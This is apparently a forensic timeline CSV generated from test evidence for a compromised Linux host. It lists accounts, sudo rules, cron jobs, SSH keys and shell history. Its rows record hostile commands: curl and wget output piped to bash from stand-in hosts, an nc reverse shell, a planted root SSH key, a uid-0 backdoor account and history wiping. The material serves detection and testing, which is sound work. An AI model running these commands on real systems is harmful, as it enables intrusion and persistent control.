datetime_utc,date,time,source,event_type,user,host,description,metadata,raw
2025-09-12T05:00:03+00:00,2025-09-12,05:00:03,web_access,http_request,,,"192.0.2.222 ""GET /wp-admin HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /wp-admin HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:03 +0000] ""GET /wp-admin HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:00:04+00:00,2025-09-12,05:00:04,web_access,http_request,,,"192.0.2.222 ""GET /phpmyadmin HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /phpmyadmin HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:04 +0000] ""GET /phpmyadmin HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:15:00+00:00,2025-09-12,05:15:00,dpkg.log,package_install,,,dpkg install: netcat-traditional (<none> -> 1.10-47),"{""package"": ""netcat-traditional"", ""action"": ""install"", ""old"": ""<none>"", ""new"": ""1.10-47""}",2025-09-12 05:15:00 install netcat-traditional:amd64 <none> 1.10-47
2025-09-12T05:15:01+00:00,2025-09-12,05:15:01,dpkg.log,package_status,,,dpkg status: installed (netcat-traditional:amd64 -> 1.10-47),"{""package"": ""installed"", ""action"": ""status"", ""old"": ""netcat-traditional:amd64"", ""new"": ""1.10-47""}",2025-09-12 05:15:01 status installed netcat-traditional:amd64 1.10-47
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,/etc/hosts: 127.0.0.1 -> localhost,"{""ip"": ""127.0.0.1"", ""names"": [""localhost""]}",127.0.0.1 localhost
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,"/etc/hosts: ::1 -> localhost, ip6-localhost, ip6-loopback","{""ip"": ""::1"", ""names"": [""localhost"", ""ip6-localhost"", ""ip6-loopback""]}",::1 localhost ip6-localhost ip6-loopback
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,"/etc/hosts: 127.0.1.1 -> web01.example.com, web01","{""ip"": ""127.0.1.1"", ""names"": [""web01.example.com"", ""web01""]}",127.0.1.1 web01.example.com web01
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,/etc/hosts: 185.199.108.133 -> github.com,"{""ip"": ""185.199.108.133"", ""names"": [""github.com""]}",185.199.108.133 github.com
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,root,,User present: root uid=0 shell=/bin/bash home=/root,"{""uid"": 0, ""gid"": 0, ""shell"": ""/bin/bash"", ""home"": ""/root""}",root:x:0:0:root:/root:/bin/bash
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,daemon,,User present: daemon uid=1 shell=/usr/sbin/nologin home=/usr/sbin,"{""uid"": 1, ""gid"": 1, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/usr/sbin""}",daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,bin,,User present: bin uid=2 shell=/usr/sbin/nologin home=/bin,"{""uid"": 2, ""gid"": 2, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/bin""}",bin:x:2:2:bin:/bin:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,sys,,User present: sys uid=3 shell=/usr/sbin/nologin home=/dev,"{""uid"": 3, ""gid"": 3, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/dev""}",sys:x:3:3:sys:/dev:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,www-data,,User present: www-data uid=33 shell=/bin/bash home=/var/www,"{""uid"": 33, ""gid"": 33, ""shell"": ""/bin/bash"", ""home"": ""/var/www""}",www-data:x:33:33:www-data:/var/www:/bin/bash
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,nobody,,User present: nobody uid=65534 shell=/usr/sbin/nologin home=/nonexistent,"{""uid"": 65534, ""gid"": 65534, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/nonexistent""}",nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,alice,,User present: alice uid=1000 shell=/bin/bash home=/home/alice,"{""uid"": 1000, ""gid"": 1000, ""shell"": ""/bin/bash"", ""home"": ""/home/alice""}","alice:x:1000:1000:Alice,,,:/home/alice:/bin/bash"
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,bob,,User present: bob uid=1001 shell=/bin/bash home=/home/bob,"{""uid"": 1001, ""gid"": 1001, ""shell"": ""/bin/bash"", ""home"": ""/home/bob""}","bob:x:1001:1001:Bob,,,:/home/bob:/bin/bash"
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,sshd,,User present: sshd uid=110 shell=/usr/sbin/nologin home=/run/sshd,"{""uid"": 110, ""gid"": 65534, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/run/sshd""}",sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,mysql,,User present: mysql uid=111 shell=/bin/false home=/nonexistent,"{""uid"": 111, ""gid"": 120, ""shell"": ""/bin/false"", ""home"": ""/nonexistent""}",mysql:x:111:120:MySQL:/nonexistent:/bin/false
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,backup,,User present: backup uid=34 shell=/bin/bash home=/var/backups,"{""uid"": 34, ""gid"": 34, ""shell"": ""/bin/bash"", ""home"": ""/var/backups""}",backup:x:34:34:backup:/var/backups:/bin/bash
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,toor,,User present: toor uid=0 shell=/bin/bash home=/root,"{""uid"": 0, ""gid"": 0, ""shell"": ""/bin/bash"", ""home"": ""/root""}",toor:x:0:0:root backup:/root:/bin/bash
2026-04-27T10:55:06+00:00,2026-04-27,10:55:06,sshd_config,config_loaded,,,sshd_config parsed: /home/claude/test_evidence/etc/ssh/sshd_config,"{""directives"": {""port"": ""22"", ""permitrootlogin"": ""yes"", ""permitemptypasswords"": ""no"", ""passwordauthentication"": ""yes"", ""pubkeyauthentication"": ""yes"", ""challengeresponseauthentication"": ""no"", ""usepam"": ""yes"", ""printmotd"": ""no"", ""acceptenv"": ""lang lc_*"", ""subsystem"": ""sftp /usr/lib/openssh/sftp-server""}}",
2026-04-27T10:55:11+00:00,2026-04-27,10:55:11,authorized_keys,ssh_key_present,claude,,authorized_keys entry: user=claude type=ssh-rsa comment=attacker@evil,"{""user"": ""claude"", ""options"": ""command=\""/usr/local/bin/.x/run.sh\"",no-pty,no-X11-forwarding"", ""type"": ""ssh-rsa"", ""comment"": ""attacker@evil"", ""fingerprint_b64_prefix"": ""AAAAB3NzaC1yc2EAAAA..."", ""file"": ""/home/claude/test_evidence/root/.ssh/authorized_keys""}",
2026-04-27T10:55:11+00:00,2026-04-27,10:55:11,authorized_keys,ssh_key_present,claude,,authorized_keys entry: user=claude type=ssh-ed25519 comment=admin@laptop,"{""user"": ""claude"", ""options"": """", ""type"": ""ssh-ed25519"", ""comment"": ""admin@laptop"", ""fingerprint_b64_prefix"": ""AAAAC3NzaC1lZDI1NTE5AAAA"", ""file"": ""/home/claude/test_evidence/root/.ssh/authorized_keys""}",
2026-04-27T10:55:14+00:00,2026-04-27,10:55:14,authorized_keys,ssh_key_present,claude,,authorized_keys entry: user=claude type=ssh-ed25519 comment=alice@laptop,"{""user"": ""claude"", ""options"": """", ""type"": ""ssh-ed25519"", ""comment"": ""alice@laptop"", ""fingerprint_b64_prefix"": ""AAAAC3NzaC1lZDI1NTE5AAAA"", ""file"": ""/home/claude/test_evidence/home/alice/.ssh/authorized_keys""}",
2026-04-27T10:55:18+00:00,2026-04-27,10:55:18,sudoers,sudo_rule,,,sudo rule: alice ALL=(ALL) NOPASSWD:ALL,"{""who"": ""alice"", ""host"": ""ALL"", ""runas"": ""ALL"", ""tags"": ""NOPASSWD:"", ""commands"": ""ALL"", ""file"": ""/home/claude/test_evidence/etc/sudoers.d/90-custom""}",alice ALL=(ALL) NOPASSWD: ALL
2026-04-27T10:55:18+00:00,2026-04-27,10:55:18,sudoers,sudo_rule,,,sudo rule: www-data ALL=(ALL) NOPASSWD:/usr/bin/visudo,"{""who"": ""www-data"", ""host"": ""ALL"", ""runas"": ""ALL"", ""tags"": ""NOPASSWD:"", ""commands"": ""/usr/bin/visudo"", ""file"": ""/home/claude/test_evidence/etc/sudoers.d/90-custom""}",www-data ALL=(ALL) NOPASSWD: /usr/bin/visudo
2026-04-27T10:55:23+00:00,2026-04-27,10:55:23,sudoers,sudo_rule,,,sudo rule: root ALL=(ALL:ALL) ALL,"{""who"": ""root"", ""host"": ""ALL"", ""runas"": ""ALL:ALL"", ""tags"": """", ""commands"": ""ALL"", ""file"": ""/home/claude/test_evidence/etc/sudoers""}",root ALL=(ALL:ALL) ALL
2026-04-27T10:55:23+00:00,2026-04-27,10:55:23,sudoers,sudo_rule,,,sudo rule: %sudo ALL=(ALL:ALL) ALL,"{""who"": ""%sudo"", ""host"": ""ALL"", ""runas"": ""ALL:ALL"", ""tags"": """", ""commands"": ""ALL"", ""file"": ""/home/claude/test_evidence/etc/sudoers""}",%sudo ALL=(ALL:ALL) ALL
2026-04-27T10:55:34+00:00,2026-04-27,10:55:34,cron,cron_entry,root,,cron[root] sched=*/5 * * * * cmd=curl -s http://198.51.100.7/x.sh | bash,"{""schedule"": ""*/5 * * * *"", ""user"": ""root"", ""command"": ""curl -s http://198.51.100.7/x.sh | bash"", ""file"": ""/home/claude/test_evidence/etc/cron.d/sysmaint""}",*/5 * * * * root curl -s http://198.51.100.7/x.sh | bash
2026-04-27T10:55:34+00:00,2026-04-27,10:55:34,cron,cron_entry,www-data,,cron[www-data] sched=@reboot cmd=/tmp/.cache/agent,"{""schedule"": ""@reboot"", ""user"": ""www-data"", ""command"": ""/tmp/.cache/agent"", ""file"": ""/home/claude/test_evidence/etc/cron.d/sysmaint""}",@reboot www-data /tmp/.cache/agent
2026-04-27T10:55:34+00:00,2026-04-27,10:55:34,cron,cron_entry,root,,cron[root] sched=17 * * * * cmd=cd / && run-parts --report /etc/cron.hourly,"{""schedule"": ""17 * * * *"", ""user"": ""root"", ""command"": ""cd / && run-parts --report /etc/cron.hourly"", ""file"": ""/home/claude/test_evidence/etc/cron.d/sysmaint""}",17 * * * * root cd / && run-parts --report /etc/cron.hourly
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=17 * * * * cmd=cd / && run-parts --report /etc/cron.hourly,"{""schedule"": ""17 * * * *"", ""user"": ""root"", ""command"": ""cd / && run-parts --report /etc/cron.hourly"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=25 6 * * * cmd=test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ),"{""schedule"": ""25 6 * * *"", ""user"": ""root"", ""command"": ""test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=47 6 * * 7 cmd=test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ),"{""schedule"": ""47 6 * * 7"", ""user"": ""root"", ""command"": ""test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=52 6 1 * * cmd=test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ),"{""schedule"": ""52 6 1 * *"", ""user"": ""root"", ""command"": ""test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
2026-04-27T10:55:45+00:00,2026-04-27,10:55:45,cron,cron_entry,alice,,cron[alice] sched=*/30 * * * * cmd=/home/alice/scripts/sync.sh,"{""schedule"": ""*/30 * * * *"", ""user"": ""alice"", ""command"": ""/home/alice/scripts/sync.sh"", ""file"": ""/home/claude/test_evidence/var/spool/cron/crontabs/alice""}",*/30 * * * * /home/alice/scripts/sync.sh
2026-04-27T10:55:45+00:00,2026-04-27,10:55:45,cron,cron_entry,alice,,cron[alice] sched=@reboot cmd=-qO- http://example.com/agent.sh | bash,"{""schedule"": ""@reboot"", ""user"": ""alice"", ""command"": ""-qO- http://example.com/agent.sh | bash"", ""file"": ""/home/claude/test_evidence/var/spool/cron/crontabs/alice""}",@reboot wget -qO- http://example.com/agent.sh | bash
2026-04-27T10:55:48+00:00,2026-04-27,10:55:48,systemd,unit_present,,,systemd unit: sysmaint.service ExecStart=/tmp/.cache/helper --daemon,"{""name"": ""sysmaint.service"", ""path"": ""/home/claude/test_evidence/etc/systemd/system/sysmaint.service"", ""exec_start"": [""/tmp/.cache/helper --daemon""], ""exec_start_pre"": [], ""user"": ""root"", ""type"": ""simple"", ""wantedby"": [""multi-user.target""], ""description"": ""System Maintenance Helper""}",
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: cd /tmp,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",cd /tmp
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: wget http://198.51.100.7/x -O agent,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",wget http://198.51.100.7/x -O agent
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: chmod +x agent,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",chmod +x agent
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: ./agent &,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",./agent &
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: curl -s http://attacker.example/payload.sh | bash,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",curl -s http://attacker.example/payload.sh | bash
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: nc -e /bin/sh 198.51.100.7 4444,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",nc -e /bin/sh 198.51.100.7 4444
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,"claude: echo ""ssh-rsa AAAAB3..."" >> /root/.ssh/authorized_keys","{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}","echo ""ssh-rsa AAAAB3..."" >> /root/.ssh/authorized_keys"
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: crontab -e,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",crontab -e
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: visudo,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",visudo
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: unset HISTFILE,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",unset HISTFILE
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: history -c,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",history -c
2026-09-12T02:00:00+00:00,2026-09-12,02:00:00,maillog,maillog:postfix/smtpd,,web01,connect from unknown[203.0.113.50],"{""program"": ""postfix/smtpd""}",Sep 12 02:00:00 web01 postfix/smtpd[8000]: connect from unknown[203.0.113.50]
2026-09-12T02:00:01+00:00,2026-09-12,02:00:01,maillog,maillog:postfix/smtpd,,web01,NOQUEUE: reject: RCPT from unknown[203.0.113.50]: 554 5.7.1 Service unavailable,"{""program"": ""postfix/smtpd""}",Sep 12 02:00:01 web01 postfix/smtpd[8000]: NOQUEUE: reject: RCPT from unknown[203.0.113.50]: 554 5.7.1 Service unavailable
2026-09-12T02:00:02+00:00,2026-09-12,02:00:02,maillog,maillog:postfix/smtpd,,web01,disconnect from unknown[203.0.113.50],"{""program"": ""postfix/smtpd""}",Sep 12 02:00:02 web01 postfix/smtpd[8000]: disconnect from unknown[203.0.113.50]
2026-09-12T02:30:00+00:00,2026-09-12,02:30:00,syslog,syslog:systemd,,web01,Started Daily apt download activities.,"{""program"": ""systemd""}",Sep 12 02:30:00 web01 systemd[1]: Started Daily apt download activities.
2026-09-12T02:30:01+00:00,2026-09-12,02:30:01,syslog,syslog:systemd,,web01,apt-daily.service: Succeeded.,"{""program"": ""systemd""}",Sep 12 02:30:01 web01 systemd[1]: apt-daily.service: Succeeded.
